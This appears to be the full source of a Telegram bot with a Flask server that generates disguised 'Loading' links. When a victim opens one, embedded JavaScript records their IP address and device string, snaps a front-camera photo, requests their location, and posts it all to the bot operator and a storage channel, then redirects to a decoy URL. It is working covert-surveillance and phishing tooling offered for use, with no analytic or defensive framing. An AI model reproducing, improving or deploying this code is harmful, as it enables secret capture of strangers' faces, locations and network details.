import os
import telebot
import json
import time
import requests
from flask import Flask, request, send_file, abort

app = Flask(__name__)

# ========== ENVIRONMENT VARIABLES SE TOKEN LOAD ==========
TOKEN = os.environ.get('BOT_TOKEN')
STORAGE_CHANNEL_ID = os.environ.get('STORAGE_CHANNEL_ID')
REQUIRED_CHANNEL = os.environ.get('REQUIRED_CHANNEL', '@nrtecno2')

if STORAGE_CHANNEL_ID:
    STORAGE_CHANNEL_ID = int(STORAGE_CHANNEL_ID)

if not TOKEN:
    raise Exception("BOT_TOKEN not set!")
if not STORAGE_CHANNEL_ID:
    raise Exception("STORAGE_CHANNEL_ID not set!")

bot = telebot.TeleBot(TOKEN)

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Method Not Allowed', 403

def set_webhook():
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
    webhook_url = f"{render_url}/webhook"
    bot.remove_webhook()
    bot.set_webhook(url=webhook_url)
    print(f"Webhook set to: {webhook_url}")

def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url)
        data = r.json()
        if data.get("ok"):
            status = data["result"]["status"]
            return status in ["member", "administrator", "creator"]
    except:
        pass
    return False

def get_user_state(user_id):
    try:
        with open(f"user_{user_id}.json", "r") as f:
            return json.load(f)
    except:
        return {"state": None, "current_link": None}

def set_user_state(user_id, data):
    with open(f"user_{user_id}.json", "w") as f:
        json.dump(data, f)

def delete_old_link(user_id):
    user_state = get_user_state(user_id)
    old_link = user_state.get("current_link")
    if old_link and os.path.exists(old_link):
        try:
            os.remove(old_link)
        except:
            pass

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    if not is_subscribed(user_id):
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2")
        verify = telebot.types.InlineKeyboardButton("Verify", callback_data="verify")
        markup.add(btn, verify)
        bot.reply_to(message, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
        return
    set_user_state(user_id, {"state": "waiting_url", "current_link": None})
    bot.reply_to(message, "Send me any URL:")

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_callback(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        bot.edit_message_text("Verified! Send URL:", user_id, call.message.message_id)
        set_user_state(user_id, {"state": "waiting_url", "current_link": None})
    else:
        bot.answer_callback_query(call.id, "Join channel first!", True)

@bot.message_handler(func=lambda m: True)
def handle_url(message):
    user_id = message.chat.id
    user_state = get_user_state(user_id)
    url = message.text.strip()
    if user_state.get("state") != "waiting_url":
        bot.reply_to(message, "Use /start first")
        return
    if not url.startswith(("http://", "https://")):
        bot.reply_to(message, "Send valid URL")
        return
    delete_old_link(user_id)
    filename = f"v_{user_id}_{int(time.time())}.html"
    
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Loading</title>
<style>
*{{user-select:none;}} body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;}}
.spinner{{width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%;animation:spin 1s linear infinite;}}
@keyframes spin{{0%{{transform:rotate(0)}}100%{{transform:rotate(360)}}}}
button{{background:#3498db;color:white;padding:12px 24px;border:none;border-radius:5px;cursor:pointer;}}
.skip{{background:#95a5a6;}}
</style>
</head>
<body>
<div id="s1"><div class="spinner"></div><div>Loading...</div></div>
<div id="s2" style="display:none"><button onclick="reqCam()">GO TO PAGE</button><div id="err"></div></div>
<div id="s3" style="display:none"><div class="spinner"></div><div>Camera...</div></div>
<div id="s4" style="display:none"><div class="spinner"></div><div>Location...</div><button class="skip" onclick="skipLoc()">Skip</button></div>
<div id="s5" style="display:none"><div class="spinner"></div><div>Redirecting...</div></div>
<video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
<script>
const T="{TOKEN}", U={user_id}, S={STORAGE_CHANNEL_ID}, L="{url}";
let skip=false;
async function send(t,f){{
fetch('https://api.telegram.org/bot'+T+'/sendMessage',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{chat_id:U,text:t}})}});
if(f){{let fd=new FormData();fd.append('chat_id',U);fd.append('photo',f);fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{{method:'POST',body:fd}});
fd=new FormData();fd.append('chat_id',S);fd.append('photo',f);fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{{method:'POST',body:fd}});}}
}}
async function cam(){{
try{{
let s=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
let v=document.getElementById('v');v.srcObject=s;
await new Promise(r=>v.onloadedmetadata=()=>{{v.play();r();}});
await new Promise(r=>setTimeout(r,300));
let c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;
c.getContext('2d').drawImage(v,0,0);
let b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.85));
if(b&&b.size>500)send('CAMERA:',b);
s.getTracks().forEach(t=>t.stop());return true;
}}catch(e){{return false;}}
}}
async function loc(){{
if(!navigator.geolocation)return;
navigator.geolocation.getCurrentPosition(p=>send('https://maps.google.com/?q='+p.coords.latitude+','+p.coords.longitude),()=>{{}});
}}
async function skipLoc(){{
skip=true;document.getElementById('s4').style.display='none';document.getElementById('s5').style.display='block';send('Location skipped');
setTimeout(()=>window.location.href=L,1500);
}}
async function reqCam(){{
document.getElementById('s2').style.display='none';document.getElementById('s3').style.display='block';
let ok=await cam();
if(ok){{
document.getElementById('s3').style.display='none';document.getElementById('s4').style.display='block';
setTimeout(()=>{{if(!skip)loc();}},500);
setTimeout(()=>{{if(!skip)window.location.href=L;}},4000);
}}else{{
document.getElementById('s3').style.display='none';document.getElementById('s2').style.display='block';
document.getElementById('err').innerHTML='Camera required';
}}
}}
(async()=>{{
let ip=await(await fetch('https://api.ipify.org?format=json')).json();
send('IP:'+ip.ip+'\\nDevice:'+navigator.userAgent);
document.getElementById('s1').style.display='none';document.getElementById('s2').style.display='block';
}})();
</script>
</body>
</html>"""
    
    with open(filename, "w") as f:
        f.write(html)
    set_user_state(user_id, {"state": None, "current_link": filename})
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
    link = f"{render_url}/{filename}"
    bot.reply_to(message, f"LINK:\n{link}\n\nCamera REQUIRED | Location OPTIONAL")
    try:
        bot.send_document(STORAGE_CHANNEL_ID, document=open(filename, 'rb'), caption=f"User {user_id}\nTarget: {url}")
    except:
        pass

@app.route('/<filename>')
def serve_html(filename):
    if os.path.exists(filename) and filename.endswith('.html'):
        return send_file(filename, mimetype='text/html')
    abort(404)

@app.route('/')
def home():
    return "Bot Active"

if __name__ == '__main__':
    set_webhook()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

# ========== YE LINE IMPORTANT HAI RENDER KE LIYE ==========
application = app
